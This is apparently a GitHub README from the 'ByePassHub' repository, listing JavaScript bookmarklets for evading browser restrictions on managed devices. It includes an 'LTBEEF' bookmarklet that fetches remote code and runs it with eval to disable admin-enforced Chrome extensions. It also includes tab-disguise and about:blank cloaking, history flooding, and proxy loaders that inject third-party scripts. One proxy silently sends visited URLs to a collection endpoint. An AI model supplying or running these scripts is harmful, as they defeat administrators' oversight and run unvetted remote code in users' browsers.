## ByePassHub > Exploits > Bookmarklets > Bookmarklets
## If you like this, make sure to star it!
**If you need help on creating a bookmarklet**, Go [here](https://github.com/wea-f/ByePassHub/blob/main/Exploits/Bookmarklets/CreatingBookmarklets.md) or to the CreatingBookmarklets file<br>
**Unblocker and game links**: Go [here](https://github.com/wea-f/ByePassHub/blob/main/mainUnblockers.md) or go to the mainUnblockers.md file. <br>
**Main game links:** [Here](https://github.com/wea-f/ByePassHub/blob/main/Games.md)  <br>

---

### This is a collection of bookmarklets<br>

> [!WARNING]
> ⚠️ Use at your own risk. This is heavily outdated, highly recommend checking out https://github.com/wea-f/ByePassHub/blob/main/Exploits/Helpful%20Info%20.md#exploit-collections

---
Table of Contents & Shortcuts
- [History Flooder](#history-flooder-made-by-blazerhm)
- [Tab Disguise](#tab-disguise)
- [About:blank Embedder](#about-blank-embedder)
- [Ad Blocker](#ad-blocker)
- [Youtube Ad Skipper](#youtube-ad-skipper)
- [Show Password on Login](#show-password--in-case-if-you-forget-your-password-on-the-login-screen-lol)
- [Developer Console](#developer-console)
- [Proxies](#proxies)
- [Calculator](#calculator)
- [Dictionary](#dictionary--highlight-words-and-it-shows-you-the-definition-again-doesnt-show-in-your-history)
- [Font Finder](#font-finder)
- [Unblocked Youtube](#unblocked-youtube)
- [Edit page](#edit-page)
- [Close Active Bookmarklets](#close-active-bookmarklets)
- [Draw on Your Page](#draw-on-your-page)
- [Dark Mode](#dark-mode)
---

## What it does | note if needed

## History Flooder made by BlazerHM
```js
javascript:var num=prompt("How many times do you want this page to show up in your history?");done=false;x=window.location.href;for (var i=1; i<=num; i++){history.pushState(0, 0, i==num?x:i.toString());if(i==num){done=true}}if(done===true){alert("Flooding successful!\n "+window.location.href+" \nis now in your history "+num+(num==1?" time.":" Times. "))}
```
After executing, put the amount of times you want the page to show up, too many crashes chrome.


## LTBEEF - disables extensions
Before executing, go to ```https://chrome.google.com/webstorex```, if it says 404, it's fine. <br>
If this doesn't work, substitute the `x` for something else, like ```https://chrome.google.com/webstoreIReplacedItRightHere``` <br>
Once on the site, execute one of the two codes below. <br>
Next, switch off the extensions you want to disable <br>
```js
javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
```
OR
```js
javascript:(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot/ingot.min.js';document.body.appendChild(a);}())
```

## Tab Disguise
```js
javascript:function gcloak() { var link = document.querySelector("link[rel*='icon']") || document.createElement('link');link.type = 'image/x-icon';link.rel = 'shortcut icon';link.href = 'https://www.pngall.com/wp-content/uploads/9/Google-Drive-Logo-Transparent-180x180.png';document.title = 'My Drive - Google Drive';console.log(document.title);document.getElementsByTagName('head')[0].appendChild(link) };gcloak();setInterval(gcloak, 1000);
```

## About:blank embedder
```js
javascript: (function () {var url = prompt('Paste the link you want to be embedded into an about:blank page.\n(INCLUDE https://)', 'https://example.com'); var urlObj = new window.URL(window.location.href); win = window.open(); win.document.body.style.margin = '0'; win.document.body.style.height = '100vh'; var iframe = win.document.createElement('iframe'); iframe.style.border = 'none'; iframe.style.width = '100%'; iframe.style.height = '100%'; iframe.style.margin = '0'; iframe.referrerpolicy = 'no-referrer'; iframe.allow = 'fullscreen'; iframe.src = url.toString(); win.document.body.appendChild(iframe); var script = win.document.createElement('script'); script.src = 'https://zatoga.pages.dev/js/main.min.js'; win.document.body.appendChild(script); })();
```

## Ad Blocker
```js
javascript:(function(){    /* Ad-B-Gone: Bookmarklet that removes obnoxious ads from pages */    var selectors = [    /* By ID: */    '#sidebar-wrap', '#advert', '#xrail', '#middle-article-advert-container',    '#sponsored-recommendations', '#around-the-web', '#sponsored-recommendations',    '#taboola-content', '#taboola-below-taboola-native-thumbnails', '#inarticle_wrapper_div',    '#rc-row-container', '#ads', '#at-share-dock', '#at4-share', '#at4-follow', '#right-ads-rail',    'div#ad-interstitial', 'div#advert-article', 'div#ac-lre-player-ph',    /* By Class: */    '.ad', '.avert', '.avert__wrapper', '.middle-banner-ad', '.advertisement',    '.GoogleActiveViewClass', '.advert', '.cns-ads-stage', '.teads-inread', '.ad-banner',    '.ad-anchored', '.js_shelf_ads', '.ad-slot', '.antenna', '.xrail-content',    '.advertisement__leaderboard', '.ad-leaderboard', '.trc_rbox_outer', '.ks-recommended',    '.article-da', 'div.sponsored-stories-component', 'div.addthis-smartlayers',    'div.article-adsponsor', 'div.signin-prompt', 'div.article-bumper', 'div.video-placeholder',    'div.top-ad-container', 'div.header-ad', 'div.ad-unit', 'div.demo-block', 'div.OUTBRAIN',    'div.ob-widget', 'div.nwsrm-wrapper', 'div.announcementBar', 'div.partner-resources-block',    'div.arrow-down', 'div.m-ad', 'div.story-interrupt', 'div.taboola-recommended',    'div.ad-cluster-container', 'div.ctx-sidebar', 'div.incognito-modal', '.OUTBRAIN', '.subscribe-button',    '.ads9', '.leaderboards', '.GoogleActiveViewElement', '.mpu-container', '.ad-300x600', '.tf-ad-block',    '.sidebar-ads-holder-top', '.ads-one', '.FullPageModal__scroller',    '.content-ads-holder', '.widget-area', '.social-buttons', '.ac-player-ph',    /* Other: */    'script', 'iframe', 'video', 'aside#sponsored-recommendations', 'aside[role="banner"]', 'aside',    'amp-ad', 'span[id^=ad_is_]', 'div[class*="indianapolis-optin"]', 'div[id^=google_ads_iframe]',    'div[data-google-query-id]', 'section[data-response]', 'ins.adsbygoogle', 'div[data-google-query-id]',    'div[data-test-id="fullPageSignupModal"]', 'div[data-test-id="giftWrap"]' ];    for(let i in selectors) {        let nodesList = document.querySelectorAll(selectors[i]);        for(let i = 0; i < nodesList.length; i++) {            let el = nodesList[i];            if(el && el.parentNode)                el.parentNode.removeChild(el);        }    }})();
```
## Youtube Ad Skipper
```js
javascript:if(document.getElementsByClassName("video-ads")[0].innerHTML !==""){ var banner = false; for(var i = 0; i < document.getElementsByClassName("ytp-ad-overlay-close-button").length; i++){ document.getElementsByClassName("ytp-ad-overlay-close-button")[i].click(); banner = true;} if(banner === false){ document.getElementsByClassName("html5-main-video")[0].currentTime = document.getElementsByClassName("html5-main-video")[0].duration; document.getElementsByClassName("ytp-ad-skip-button")[0].click();} }void 0;
```
## Show Password | In case if you forget your password on the login screen lol
```js
javascript:Array.prototype.slice.call(document.querySelectorAll("input[type='password']")).map(function(el){el.setAttribute('type','text')})
```
## Inspect Element
```js
javascript: javascript:document.body.contentEditable = 'true'; document.designMode='on'; void 0
```
Another inspect element:
```js
javascript:(function()%7B(function() %7Bvar x %3D document.createElement("script")%3Bx.src %3D "https%3A%2F%2Fcdn.jsdelivr.net%2Fgh%2FSnowLord7%2Fdevconsole%40master%2Fmain.js"%3Bx.onload %3D alert("Loaded Developer Console!")%3Bdocument.head.appendChild(x)%3B%7D)()%7D)()
```
Another Inspect (Google Xray):
```js
javascript:(function () {var script=document.createElement('script');script.src='https://x-ray-goggles.mouse.org/webxray.js';script.className='webxray';script.setAttribute('data-lang','en-US');script.setAttribute('data-baseuri','https://x-ray-goggles.mouse.org');document.body.appendChild(script);}())
```
Another inspect element (eruda) - 4/14/24:
```js
javascript:(function () { var script = document.createElement('script'); script.src='//cdn.jsdelivr.net/npm/eruda'; document.body.appendChild(script); script.onload = function () { eruda.init() } })();
```
Another inspect element (firebug)- 4/14/24
```js
javascript:var firebug=document.createElement('script');firebug.setAttribute('src','https://luphoria.com/fbl/fbl/firebug-lite-debug.js');document.body.appendChild(firebug);(function(){if(window.firebug.version){firebug.init();}else{setTimeout(arguments.callee);}})();void(firebug);
```

## Developer Console
```js
javascript:(function()%7B(function() %7Bvar x %3D document.createElement("script")%3Bx.src %3D "https%3A%2F%2Fcdn.jsdelivr.net%2Fgh%2FSnowLord7%2Fdevconsole%40master%2Fmain.js"%3Bx.onload %3D alert("Loaded Developer Console!")%3Bdocument.head.appendChild(x)%3B%7D)()%7D)()
```
## Proxies
```js
javascript:(function(){var bkmkltscript = document.createElement('script'); bkmkltscript.src = 'https://cdn.jsdelivr.net/gh/proxyhost/bookmarklets/aiobkmklt.js'; document.body.appendChild(bkmkltscript);})();
```
2nd (opens in about:blank):
```js
javascript: var win = window.open(); var url = 'https://nebula.galaxybender.repl.co/'; var iframe = win.document.createElement(%27iframe%27); iframe.style="position:fixed;width:100vw;height:100vh;top:0px;left:0px;right:0px;bottom:0px;z-index:2147483647;background-color:white;border:none;"; iframe.src = url; win.document.body.appendChild(iframe);
```
3rd (opens in about:blank):
```js
javascript: var win = window.open(); var url = 'https://ultraviolet-node.galaxybender.repl.co/'; var iframe = win.document.createElement(%27iframe%27); iframe.style="position:fixed;width:100vw;height:100vh;top:0px;left:0px;right:0px;bottom:0px;z-index:2147483647;background-color:white;border:none;"; iframe.src = url; win.document.body.appendChild(iframe);
```
4th (opens in about:blank):
```js
javascript: var win = window.open(); var url = 'https://incognito.galaxybender.repl.co/'; var iframe = win.document.createElement(%27iframe%27); iframe.style="position:fixed;width:100vw;height:100vh;top:0px;left:0px;right:0px;bottom:0px;z-index:2147483647;background-color:white;border:none;"; iframe.src = url; win.document.body.appendChild(iframe);
```
5th (opens in about:blank):
```js
javascript: var win = window.open(); var url = 'https://website-aio.galaxybender.repl.co/'; var iframe = win.document.createElement(%27iframe%27); iframe.style="position:fixed;width:100vw;height:100vh;top:0px;left:0px;right:0px;bottom:0px;z-index:2147483647;background-color:white;border:none;"; iframe.src = url; win.document.body.appendChild(iframe);
```
6th (opens in about:blank):
```js
javascript:(function(){var url = prompt("Enter website url for cloaked page \n Made by Exploits N' Stuff"); var win = window.open(); var iframe = win.document.createElement(%27iframe%27); iframe.style="position:fixed;width:100vw;height:100vh;top:0px;left:0px;right:0px;bottom:0px;z-index:2147483647;background-color:white;border:none;"; if(url.includes('https://') || url.includes("http://")) {iframe.src = url;}else{iframe.src = "https://" + url;} win.document.body.appendChild(iframe);})();
```
7th:
```js
javascript:(()=>{let e='[1,2]';function t(e){return e.toString(16).padStart(2,'0')}function o(e){let o=new Uint8Array((e||40)/2);return window.crypto.getRandomValues(o),Array.from(o,t).join('')}let n=o(20);function r(e,t){return prompt('[Legend7269s proxy]\n'+e,t)}function a(e){return confirm('[Legend7269s proxy]\n'+e)}function l(e){return alert('[92dev proxy]\n'+e)}function c(){let e=r('Enter the URL to access:');return null===e||''===e.trim()?null:e=new URL((e=e.replace(%27-%27,%27%27)).indexOf(%27http%27)?%27http://%27+e:e)}function i(e,t){fetch(%27https://dev.92spoons.com/api/fakehacks/proxy/collect.php%27,{method:%27POST%27,headers:{%27Content-Type%27:%27application/json%27},body:JSON.stringify({url:e,version:%271.0.0%27,from:window.location.href,sessionRandomId:n,proxy:t}),mode:%27cors%27})}!function t(){let o=c();if(null===o)return;let n=new URL(o);!function t(){let l=r(%27Proxy method to use:\nCurrently available proxies are numbered %27+e+%27.%27,1);null!==l&&(1==l?(i(o,1),window.location.href=%27https://webcache.googleusercontent.com/search?q=cache%3A%27+encodeURIComponent(n)):2==l?(i(o,2),window.location.href=%27https://%27+n.hostname.replace(/\./g,%27-%27)+%27.translate.goog%27+n.pathname+%27?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=wapp%27):(i(o,%27oob%27),a(%27That proxy id is invalid. Please choose a proxy in the range %27+e+%27.\nIf none of the proxies are working for you, you can ask for more at https://github.com/Legend7269/Bookmarklets%27)&&t()))}()}()})();
```
NEW! 8th:
```js
javascript:(function(){var url = "https://aubruh.tech/"; if(!url.startsWith("https://") && !url.startsWith("//") && url != ""){url="https://"+url;}document.body.innerHTML = '<div style="font-size:18px;display:flex;justify-content:center;align-items:center;width:100%;height:100%;">Loading Uto<span>pi</span>a Unbl<span>ock</span>er...</div><iframe src="' + (url || "https://utopiabeta.tk") + '" width="100%" height="100%" style="position:absolute;top:0;left:0;" frameborder="0">Your browser doesn\'t support iframes :(</iframe>';document.body.style.width="100vw";document.body.style.height="100vh";document.body.style.overflow="hidden";}())
```

NEW! 9th:
```js
javascript:(function(){var url = "https://utopiabeta.tk"; if(!url.startsWith("https://") && !url.startsWith("//") && url != ""){url="https://"+url;}document.body.innerHTML = '<div style="font-size:18px;display:flex;justify-content:center;align-items:center;width:100%;height:100%;">Loading Uto<span>pi</span>a Unbl<span>ock</span>er...</div><iframe src="' + (url || "https://utopiabeta.tk") + '" width="100%" height="100%" style="position:absolute;top:0;left:0;" frameborder="0">Your browser doesn\'t support iframes :(</iframe>';document.body.style.width="100vw";document.body.style.height="100vh";document.body.style.overflow="hidden";}())
```

NEW! 10th:
```js
javascript:(function(){var url = "https://surftheweb.chideraokwuosa.repl.co/"; if(!url.startsWith("https://") && !url.startsWith("//") && url != ""){url="https://"+url;}document.body.innerHTML = '<div style="font-size:18px;display:flex;justify-content:center;align-items:center;width:100%;height:100%;font-family:Arial">Loading Uto<span>pi</span>a Unbl<span>ock</span>er...</div><iframe src="' + (url || "https://surftheweb.chideraokwuosa.repl.co") + '" width="100%" height="100%" style="position:absolute;top:0;left:0;" frameborder="0">Your browser doesn\'t support iframes :(</iframe>';document.body.style.width="100vw";document.body.style.height="100vh";document.body.style.overflow="hidden";}())
```

NEW! 11th (4/14):
```js
javascript:var a='https://translate.google.com/translate?u=%27%27;var%20b=encodeURI(location.href);var%20c=%27?tl=en%27;open(a+b+c);
```

## Calculator 
```js
javascript:eval('function calc(){_o=prompt(_t,_z);if(_o!=\'\'&&_o!=null&&_o.toUpperCase()==_o.toLowerCase())_z=eval(_o);}');_t='JAVASCRIPTER.NET Calculator - Input the expression to be calculated:';_z='';calc();while(_o!=''&&_o!=null&&_o.toUpperCase()==_o.toLowerCase())calc()
```
## Dictionary | Highlight words and it shows you the definition, again, doesn't show in your history
```js
javascript:var q=escape(window.getSelection()),i,ii;if(!q){for(i=0;i<frames.length;i++){var fr=frames[i];try{q=escape(fr.getSelection())}catch(e){};if(q)break;else{for(ii=0;ii<fr.frames.length;ii++){try{q=escape(fr.frames[ii].getSelection())}catch(e){};if(q)break;}}}}if(!q)void(q=prompt('Enter word to define%3A',''));if(q)void(location.href='http://www.dictionary.com/cgi-bin/dict.pl?term=%27+q);```
```
## Font Finder 
```js
javascript:(function(){var d=document,s=d.createElement('scr'+'ipt'),b=d.body,l=d.location;s.setAttribute('src','http://chengyinliu.com/wf.js?o='+encodeURIComponent(l.href)+'&t='+(new Date().getTime()));b.appendChild(s)})();
```
## Unblocked Youtube
```js
javascript:(function () {if (window.location.toString().includes('www.youtube.com/watch?v%27)) { window.open(%27https://www.youtube-nocookie.com/embed/%27 + window.location.toString().split(%27=%27)[1]) }})()
```
## Edit page 
```js
javascript:console.log(document.body.contentEditable="true"==document.body.contentEditable?%22false%22:%22true%22);
```

## Close Active Bookmarklets
```js
javascript:var element = document.getElementById("rusic-modal"); element.parentNode.removeChild(element);
```
## Draw on Your Page
```js
javascript:var opt=1;alert("keyboard commands:c=color picker. u=pen up. d=pen down. s=size. o=opacity. reload to clear.");var pen='none';var size=10;function repeat(event){(function(){var color=document.createElement('div');var body=document.getElementsByTagName('body')[0];body.appendChild(color);color.style.position='fixed';color.style.bottom='0px';color.style.right='0px';color.style.margin='0px';color.style.paddingTop='0px';color.style.width='1366px';color.style.height='20px';color.style.zIndex=10000;color.style.opacity=0.8;color.style.color='white';color.style.backgroundColor='black';color.style.border='0px solid black';color.style.textAlign='center';color.style.cursor='pointer';color.id='color';color.style.display='circle';color.innerText='Made by Legend7269';document.getElementById('me').addEventListener('click',function(){window.open('https://github.com/dragon731012');});}());}function mousemove(event){var x=event.clientX;var y=event.clientY;x=x-9-size;y=y-12-size;(function(){var elem=document.createElement('div');var body=document.getElementsByTagName('body')[0];body.appendChild(elem);elem.style.position='fixed';elem.style.top=''+y+'px';elem.style.left=''+x+'px';elem.style.margin='10px';elem.style.paddingTop='10px';elem.style.width=''+size+'px';elem.style.height=''+size+'px';elem.style.zIndex=10000;elem.style.opacity=opt;elem.style.color=''+clr+'';elem.style.backgroundColor=''+clr+'';elem.style.border='0px solid white';elem.style.textAlign='center';elem.id='paint';elem.style.display=''+pen+'';elem.innerText='';}());}window.addEventListener("keydown",function(event){if (event.key=="c"){clr=prompt("what color do you want? must be very broad, and with no caps or special characters. ex:blue");elem.style.display=%27block%27;}});window.addEventListener("keydown",function(event){if (event.key=="s"){size=prompt("what size do you want? no caps, letters, or special characters. ex: 10");elem.style.display=%27block%27;}});window.addEventListener("keydown",function(event){if(event.key=="u"){pen=%27none%27;}});window.addEventListener("keydown",function(event){if(event.key=="d"){pen=%27circle%27;}});window.addEventListener("keydown",function(event){if(event.key=="o"){opt=prompt("what do you want the opacity to be? 1 to 0. 1=none. 0=a lot.");}});window.addEventListener(%27mousemove%27,mousemove);repeat();
```

## Dark Mode
```js
javascript: if (typeof all === 'undefined') {let all = [];}all = document.getElementsByTagName('*');for (let i = 0; i < all.length; i++) { if(typeof all[i].style !== 'undefined'){all[i].style.fontFamily = "Comic Sans MS";}}document.getElementsByTagName("html")[0].style.filter = "invert()";if (typeof elems === 'undefined') {let elems = [];}elems = document.querySelectorAll(" a, img, video");for (let j = 0 ; j < elems.length; j++) {if((elems[j].nodeName == "A" && (elems[j].style.background != "" || elems[j].style.backgroundImage != "")) || elems[j].nodeName != "A"){elems[j].style.filter = "invert()";}}void 0;
```
